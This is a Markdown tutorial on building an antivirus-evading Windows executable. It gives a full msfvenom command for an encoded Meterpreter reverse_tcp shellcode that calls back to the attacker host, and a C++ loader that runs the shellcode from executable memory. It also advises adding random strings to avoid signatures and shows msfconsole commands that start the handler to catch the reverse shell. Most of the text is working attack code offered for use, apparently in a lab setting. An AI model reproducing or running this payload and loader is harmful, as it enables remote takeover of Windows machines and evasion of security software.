# Evading Antivirus with Better Meterpreter Payloads

We'll create a .exe file with Metasploit, containing an exploit attempt, as well as a custom payload (code to execute).

## Tutorial Video

![Exe Attack](./images/exe_attack.png)

## Creating the shellcode with Msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.26 LPORT=443 -e x86/shikata_ga_nai -i 15 -f c -o msf_attack.c
```

- `-p`: Payload which needs to be delivered in the exploit. We have used **windows/meterpreter/reverse_tcp** the payload is staged and will connect back to our handler to deliver the complete meterpreter payload.
- `--platform`: Platform for which exploit is developed. We have used **windows** as our platform.
- `-a`: Architecture of exploit is **x86** works with both 32 and 64-bitt windows and better than **x64**.
- `LHOST`: Host to which exploit will connect. We are using our local IP here.
- `LPORT`: Port to which exploit will connect. We are using 443 to avoid windows firewall issue.
- `-e`: Encoder of exploit. We see the most success using **x86/shikata_ga_nai** with several iterations.
- `-i`: Iteration of the encoder. No of iteration for encoder **15** works fine
- `-f`: Output format of the exploit. we're using c as our format. 
- `-o`: Output path of exploit.

## Create a Visual Studio Project

Steps:

- Open Visual Studio and press “Create a new project”
- Select “Empty project”
- Choose a project name and press “Create”
- In “Source Files”, right click to add a “New item”
- Select cpp file and name this “main.cpp”

## Create Custom template

In your main.cpp file we will paste the following code:

```cpp
#include <stdio.h>
#include <windows.h>

unsigned const char payload[] = "";

size_t size = 0;

int main(int argc, char** argv) {

    char* code;

    printf("This is just a random string!\n");

    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);

    memcpy(code, payload, size);

    ((void(*)())code)();

    return(0);
}
```

We just need to change two things:

1. Add the “Payload size” number (do not use the “Final size of c file”) from when we generated the payload.
2. Replace the placeholder in payload[] with the shellcode generated in buf[]
3. Add some random text so we don’t all use the same signatures!
4. In the build dropdown select release.

## Starting a Meterpreter handler

On our attacking system, we'll now create a handler to accept incoming connections from our payload. We should ensure the IP and port are the same as used in previous steps:

```bash
$ service start postgresql
$ msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler)> set PAYLOAD windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler)> set LHOST 192.168.1.26
msf5 exploit(multi/handler)> set LPORT 443
msf5 exploit(multi/handler)> exploit -j
```

So we have the reverse TCP handler listening on port 443 for any incoming connections. Now we just need to get the files we generated earlier onto the Windows10 machine.

We have a reverse connection to the Windows10 machine from the Kali Linux command line. So let’s see what we can do with full control.

```bash
msterpreter> help
```